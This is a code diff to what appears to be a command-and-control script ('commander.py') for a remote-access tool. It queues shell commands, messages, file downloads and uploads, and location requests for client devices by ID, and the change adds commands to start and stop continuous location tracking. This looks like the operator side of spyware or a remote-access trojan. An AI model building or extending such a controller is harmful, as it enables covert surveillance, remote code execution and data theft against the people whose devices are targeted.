@@ -22,7 +22,7 @@ def add_task(client_id, action, payload):
     print(f"[+] Task '{action}' added for {client_id}")
 
 def main():
-    if len(sys.argv) < 3: # Changed to 3 to allow 'location' which might not need a 4th arg
+    if len(sys.argv) < 3:
         print("Usage:")
         print("  python commander.py <ID> shell <command>")
         print("  python commander.py <ID> msg <message>")
@@ -30,6 +30,8 @@ def main():
         print("  python commander.py <ID> download <filename>")
         print("  python commander.py <ID> upload <remote_path>")
         print("  python commander.py <ID> location")
+        print("  python commander.py <ID> location_start")
+        print("  python commander.py <ID> location_stop")
         return
 
     client_id = sys.argv[1]
@@ -51,8 +53,11 @@ def main():
         argument = sys.argv[3]
         add_task(client_id, "upload", {"path": argument})
     elif command_type == "location":
-        # Location doesn't necessarily need a 4th argument (argument)
         add_task(client_id, "location", {})
+    elif command_type == "location_start":
+        add_task(client_id, "location_start", {})
+    elif command_type == "location_stop":
+        add_task(client_id, "location_stop", {})
     else:
         print(f"[!] Unknown command type: {command_type}")
 
